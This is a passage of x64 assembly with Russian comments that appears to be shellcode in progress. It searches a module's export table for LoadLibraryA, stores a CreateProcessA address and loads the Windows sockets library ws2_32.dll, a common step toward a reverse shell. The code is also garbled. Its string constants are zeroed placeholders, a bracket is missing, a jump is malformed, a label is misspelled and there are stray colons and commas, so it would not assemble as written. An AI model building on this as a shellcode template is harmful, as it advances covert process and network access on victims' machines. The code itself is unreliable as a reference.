  mov r14, rax ; CreateProcessA

  mov r12, 0; LoadLibr
  mov r13, 0; aryA\0\0\0\0

  xor r11, r11

.search_loop_LoadLibrary:
  mov edi, dword ptr [r8 + r11 * 4
  add rdi, r15

  ;сверение r12
  mov rax, qword ptr [rdi]
  cmp rax, r12
  jne. not_found_LoadLibrary:

  ;сверение r13
  mov rax, qword ptr [rdi + 8]
  cmp rax, r13
  je .function_found_LoadLibrary:

.not_found_LoadLlibrary:
  inc r11
  jmp .search_loop_LoadLibrary:
.function_found_2:

.function_found_LoadLibrary:
  movzx r12d, word ptr [r9 + r11 * 2]
  mov eax, dword ptr [r10 + r12 * 4]
  add rax, r15

  mov r13, rax

  mov rax, 0, ;ll\0\0\0\0\0\0
  push rax
  mov rax, 0 ;ws2_32.d
  push rax

  mov rcx, rsp
  sub rsp, 32
  call r13

  add rsp, 32
  add rsp, 16

  mov r15, rax
;exit
  sub rsp, 32
  mov ecx, 0
  call ExitProcess
start ENDP
END

